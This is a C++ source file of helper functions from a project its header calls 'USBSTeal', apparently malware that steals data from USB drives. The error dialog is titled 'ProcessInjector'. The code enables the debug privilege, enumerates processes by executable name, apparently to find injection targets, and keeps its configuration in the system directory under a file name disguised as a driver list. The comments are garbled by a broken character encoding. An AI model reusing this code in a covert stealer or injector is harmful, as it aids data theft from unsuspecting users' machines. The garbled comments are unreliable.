/*
* Copyright (c) 2005, Outmatch@gmail.com
* All rights reserved.
*
* �ļ����ƣ�misc.cpp
* �ļ���ʶ�������ù���ƻ���
* ժ    Ҫ��USBSTeal���õĹ���������������
*
* ��ǰ�汾��1.0
* ��    �ߣ�outmatch
* ������ڣ�2006��9��6��
*
* ȡ���汾����
* ԭ����  ��
* ������ڣ�
*/

#include "stdafx.h"
#include "config.h"
#include <vector>
#include "misc.h"

using namespace std;

typedef std::vector<DWORD> PIDGroup;

void reportError(LPCSTR errorFuncName)
{
	CHAR msg[BUFSIZ];
	sprintf(msg, "%s ʧ��. ������: %d :", errorFuncName,  GetLastError());
	LPVOID lpMsgBuf;
	FormatMessage(
			FORMAT_MESSAGE_ALLOCATE_BUFFER |
			FORMAT_MESSAGE_FROM_SYSTEM |
			FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL,
			GetLastError(),
			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
			(LPTSTR) &lpMsgBuf,
			0,
			NULL
			); 
	strcat(msg, (LPCSTR)lpMsgBuf);
	LocalFree(lpMsgBuf);
	MessageBox(0, msg, "ProcessInjector", 0);
	return;
}

DWORD enablePrivilege() {
	DWORD  Ret = 0;
	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
	} else {
		if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue)) {
		} else {

			tkp.PrivilegeCount = 1;
			tkp.Privileges[0].Luid = sedebugnameValue;
			tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof tkp, NULL, NULL)) {
			} else {
				Ret = 1;
			}
		}
		CloseHandle(hToken);
	}
	return(Ret);
}

// �õ������ļ�·��
const std::string& getConfigPath()
{
	static std::string s;
	extern std::string getSystemPath();
	if(s == "") {
		s = getSystemPath();
		s += "\\";
		s += "USBStor.sys.list";
	}
	return s;
}

PIDGroup GetDestProcessID(LPCSTR lpcExeName)
{
	HANDLE hProcessSnap = NULL;
	PIDGroup pid;

	if(!lpcExeName) return pid;
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap > 0)  {
		PROCESSENTRY32 pe;
		pe.dwSize = sizeof(PROCESSENTRY32);
		Process32First(hProcessSnap, &pe);
		do {
			if (stricmp(pe.szExeFile, lpcExeName) == 0) {
				//�ҵ�ID
				pid.push_back(pe.th32ProcessID);
			}
		}
		while (Process32Next(hProcessSnap, &pe));
		CloseHandle(hProcessSnap);
	}
	return pid;
}

// �õ�ϵͳ�ļ�·��
std::string getSystemPath()
{
	CHAR szSysPath[MAX_PATH+1];

	GetSystemDirectory(szSysPath, MAX_PATH);
	return szSysPath;
}

